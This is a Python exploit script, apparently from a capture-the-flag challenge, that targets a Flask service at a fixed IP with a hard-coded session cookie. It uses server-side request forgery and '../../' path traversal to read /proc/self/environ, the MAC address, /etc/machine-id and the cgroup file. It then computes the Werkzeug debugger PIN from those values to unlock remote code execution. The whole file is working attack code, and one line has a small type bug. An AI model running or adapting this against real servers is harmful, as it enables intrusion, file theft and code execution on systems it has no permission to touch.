import requests
import re

URL = "http://103.49.238.77:38619"
SESSION = "6a4c5747-693f-4c33-886a-03cb4df6ee8c.5qdtZ_1iBnG6et3TaaDfEC_pMWQ"

def feedback(send, url=URL):
    res = requests.post(f"{url}/feedback", json={
        "feedback-url": send,
    }, cookies={
        "session": SESSION,
    })
    return res.text


def check(send, url=URL):
    class m:
        text: str
        is_found: bool
    res = requests.get(f"{url}/check?file={send}")
    ret = m
    if "No such file" in res.text:
        ret.is_found = False
        ret.text = res.text
        return ret
    ret.is_found = True
    ret.text = res.text
    return ret


def get_file(file):
    feedback(f"http://127.0.0.1:8080/check?file=../../{file}")
    return check(f"../../{file}")


def get_username():
    text = get_file("/proc/self/environ").text
    username = re.search(r"(?<=HOME=/home/).*?(?=\x00)",
                         text, re.DOTALL).group(0)
    return username


def get_flask_dir():
    templ_flask = "/usr/local/lib/python3.%s/%s/flask/app.py"
    for version in [i for i in range(0, 12)]:
        for location in ['site-packages', 'dist-packages']:
            flask = templ_flask % (version, location)
            file = get_file(flask)
            if file.is_found:
                return flask
    print("something wrong")
    exit(1)


def get_mac(device="eth0"):
    mac = get_file(f"/sys/class/net/{device}/address").text
    mac = mac.replace(":", "")
    mac = eval(f"0x{mac}")
    return str(mac)


def get_machine_id():
    linux = ""
    machine_id = get_file("/etc/machine-id")
    if not machine_id.is_found:
        boot_id = get_file("/proc/sys/kernel/random/boot_id")
        linux += boot_id.text
    else:
        linux += machine_id.text
    cgroup = get_file("/proc/self/cgroup")
    try:
        linux += cgroup.text.strip().rpartition(b"/")[2]
    except:
        pass
    return linux.strip()


if __name__ == "__main__":
    username = get_username()
    flask_dir = get_flask_dir()
    mac = get_mac()
    machine_id = get_machine_id()

    print("username     :", username)
    print("flask_dir    :", flask_dir)
    print("mac          :", mac)
    print("machine_id   :", machine_id)

    from gen_pin import gen_pin

    pin = gen_pin(probably_public_bits=[
        username,  # username
        'flask.app',  # modname
        'Flask', # getattr(app, '__name__', getattr(app.__class__, '__name__'))
        flask_dir,  # getattr(mod, '__file__', None),
    ], private_bits=[
        mac,  # str(uuid.getnode()),  /sys/class/net/ens33/address
        machine_id,  # get_machine_id(), /etc/machine-id
    ])
    print("pin          :", pin)
